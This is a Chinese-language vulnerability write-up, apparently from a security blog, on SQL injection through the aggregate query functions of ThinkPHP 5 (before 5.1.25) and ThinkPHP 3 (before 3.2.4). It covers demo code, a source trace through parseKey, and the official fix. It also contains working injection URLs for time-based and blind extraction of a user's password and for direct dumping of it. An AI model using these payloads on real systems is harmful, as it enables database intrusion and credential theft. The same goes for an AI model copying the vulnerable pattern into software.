---
title: ThinkPHP 聚合查询漏洞
date: 2018-10-19 19:26:05
tags:
	- Thinkphp
	- 漏洞分析
---

# 前言

说是漏洞，更恰当一点应该是安全隐患吧，由于是框架洞，总要结合一些开发人员不够专业的代码才能产生漏洞。

这个聚合查询的漏洞主要影响的版本有

 - Thinkphp5 < 5.1.25
 - Thinkphp3 < 3.2.4

影响的函数涉及到所有的聚合查询函数

![](Thinkphp-聚合查询漏洞\1.png)

而且，有一点就是，可以看到在TP5中涉及到SQL查询的地方，几乎都用了预编译

而且由于`PDO::ATTR_EMULATE_PREPARES`设置的原因，导致模拟预处理关闭，从而在预编译阶段无法从数据库中获取数据，从而报错退出。从之前爆出的几个TP5漏洞中就能看到，这样一个很大的弊端就是即使注入存在，也无法从数据库中获取到数据。

但是这个漏洞在预编译阶段没有使用占位符，从而不会在预编译阶段报错，从而可以顺利通过注入**获取到数据**。

# ThinkPHP5 < 5.1.25

## 漏洞复现

这里创建了一个这样的`user`表

![](Thinkphp-聚合查询漏洞\2.png)

数据库配置请自行配置，然后打开`debug`和`trace`模式（方便查看SQL语句

demo样例

```php
public function index()
{
    $count = input('get.count');
    $res = db('user')->count($count);
    var_dump($res);
}
```

当访问

```
http://localhost/tp5.1.25/public/?count=id
```

就能看到返回了数量`3`

![](Thinkphp-聚合查询漏洞\3.png)

当输入

```
http://localhost/tp5.1.25/public/?count=id`),(select sleep(5)),(`username
```

就能看到有明显的五秒的延时

![](Thinkphp-聚合查询漏洞\4.png)

里面改成可以任意的SQL语句，例如通过盲注获取`password`

```
http://localhost/tp5.1.25/public/?count=id`),(if(ascii(substr((select password from user where id=1),1,1))>130,0,sleep(3))),(`username
```

![](Thinkphp-聚合查询漏洞\5.png)

## 漏洞分析

跟进到`count`函数中`thinkphp/library/think/db/Query.php:643`

![](Thinkphp-聚合查询漏洞\6.png)

跟进`$count = $this->aggregate('COUNT', $field);` `thinkphp/library/think/db/Query.php:619`

![](Thinkphp-聚合查询漏洞\7.png)

这里又调用了`$this->connection->aggregate`

注意此时的`$field`字段还是一开始传入的字符，没有任何变化

然后跟进到`thinkphp/library/think/db/Connection.php:1316`中

![](Thinkphp-聚合查询漏洞\8.png)

可以看到这里的经过第一句之后`$field`被组合成了count语句，跟到`parseKey`的函数定义中就能看到具体处理过程

```php
public function parseKey(Query $query, $key, $strict = false)
{
	...
    $key = trim($key);

    if (strpos($key, '->') && false === strpos($key, '(')) {
		...
    } elseif (strpos($key, '.') && !preg_match('/[,\'\"\(\)`\s]/', $key)) {
		...
    }

    if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
        $key = '`' . $key . '`';
    }
	...

    return $key;
}
```

省略了很多无关的处理函数，可以看到就是简单的通过反引号的字符串相连

```php
$key = '`' . $key . '`';
```

继续回来到`aggregare`中，跟进`$this->value`，这就是真正执行这条SQL语句的地方

`thinkphp/library/think/db/Connection.php:1252`

![](Thinkphp-聚合查询漏洞\9.png)

可以看到通过 `$this->builder->select($query);`将之前传入的参数直接拼接到了sql语句中

最后形成`$sql`为

```mysql
SELECT COUNT(`id`),(select sleep(5)),(`username`) AS tp_count FROM `user` LIMIT 1  
```

![](Thinkphp-聚合查询漏洞\10.png)

在`$query->getBind()`的时候是没有需要绑定的参数的，也就避免了后面预编译阶段的报错

最后`$pdo = $this->query($sql, $bind, $options['master'], true);`执行了SQL语句，产生注入

全局搜索`->aggregate`的调用，发现所有的聚合函数都是调用了这个模块，同理也就产生了SQL注入

![](Thinkphp-聚合查询漏洞\11.png)

# ThinkPHP3 < 3.2.4

## 漏洞复现

数据库配置和TP5中一致，也要打开`debug`和`trace`信息

demo样例

```php
public function index()
{
    $count = I('get.count');
    $m = M('user')->count($count);
    dump($m);
}
```

这里的payload和TP5中的有一点点的不一样，不过也差不多

```
http://localhost/tp3.2.4/?count=id),(select password from user where id=1),(username
```

![](Thinkphp-聚合查询漏洞\12.png)

可以看到直接注入出了数据

## 漏洞分析

没啥好分析的了，和TP5类似，就是少了一个反引号的差别

# 漏洞修复

官方很机智的在`parseKey`中加入了正则校验，不符合这个校验就会抛出异常

![](Thinkphp-聚合查询漏洞\13.png)















